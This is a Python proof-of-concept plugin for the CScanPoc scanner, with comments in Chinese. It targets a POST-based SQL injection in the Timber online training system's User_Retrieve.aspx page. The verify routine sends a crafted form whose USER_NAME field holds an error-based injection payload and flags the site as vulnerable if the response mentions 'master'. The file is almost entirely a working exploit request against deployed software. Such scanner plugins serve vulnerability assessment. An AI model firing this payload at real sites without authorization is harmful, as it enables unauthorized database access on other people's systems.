# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'timber2005_0003'  # 平台漏洞编号，留空
    name = '天柏在线培训系统（post）注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-05-07'  # 漏洞公布时间
    desc = '''
        天柏在线培训系统 /Web_Org/User_Retrieve.aspx 存在SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '天柏在线培训系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '36d13357-ae59-47ce-b86d-c45dd3e16141'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer:http://www.wooyun.org/bugs/wooyun-2010-059810
            hh = hackhttp.hackhttp()
            payload = '/Web_Org/User_Retrieve.aspx '
            postdata = '__VIEWSTATE=%2fwEPDwUKMTYwMzExOTg0MA9kFgJmD2QWAgIBD2QWBAIBDxYCHgRUZXh0BfkBPEEgaHJlZj0iU2VhcmNoX0xpc3QuYXNweD9TZWFyY2g95YWs5Yqh5ZGYIj7lhazliqHlkZg8L0E%2b4pSKPEEgaHJlZj0iU2VhcmNoX0xpc3QuYXNweD9TZWFyY2g95Y2r55Sf55uR552jIj7ljavnlJ%2fnm5HnnaM8L0E%2b4pSKPEEgaHJlZj0iU2VhcmNoX0xpc3QuYXNweD9TZWFyY2g96LSi57uP5rOV6KeEIj7otKLnu4%2fms5Xop4Q8L0E%2b4pSKPEEgaHJlZj0iU2VhcmNoX0xpc3QuYXNweD9TZWFyY2g95Lya6K6h6K%2bBIj7kvJrorqHor4E8L0E%2bZAIGDw8WAh8ABYcCQ29weXJpZ2h0IEAgMjAwNy0yMDEzIOS4iua1t%2bWcqOe6v%2bWfueiureezu%2be7n%2bWFrOWPuCBBbGwgUmlnaHRzIFJlc2VydmVkLjxBIGhyZWY9IiMiPuayqklDUOWkhzAwMDAwMDAw5Y%2b3PC9BPjxCUj7lnLDlnYDvvJrkuIrmtbfluILmtabkuJzmlrDljLrmtZnmoaXot68yODnlj7flu7rpk7blpKfljqZB5bqnMjEwN%2bWupCDpgq7nvJbvvJowMDAwMDA8QlI%2b6IGU57O755S16K%2bd77yaMDAwLTAwMDAwMDAwLDAwMDAwMDAwIOS8oOecn%2b%2b8mjAyMS0wMDAwMDAwMC0wMDBkZGQXvpnElTlOy1PBNmFuhovZO5Nyhg%3d%3d&ctl00$ContentPlaceHolder1$infoSave=%e6%89%be%e5%9b%9e%e5%af%86%e7%a0%81&ctl00$ContentPlaceHolder1$STU_CONTACT=3&ctl00$ContentPlaceHolder1$STU_EMAIL=netsparker%40example.com&ctl00$ContentPlaceHolder1$STU_MOBILE=3&ctl00$ContentPlaceHolder1$STU_PHONE=3&ctl00$ContentPlaceHolder1$USER_NAME=\'%20and%20db_name(1)>0--\''
            url = self.target + payload
            code, head, res, errcode, _ = hh.http(url, postdata)

            if code == 200 and 'master' in res:
                #security_hole(arg+payload+'   :found sql Injection')
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
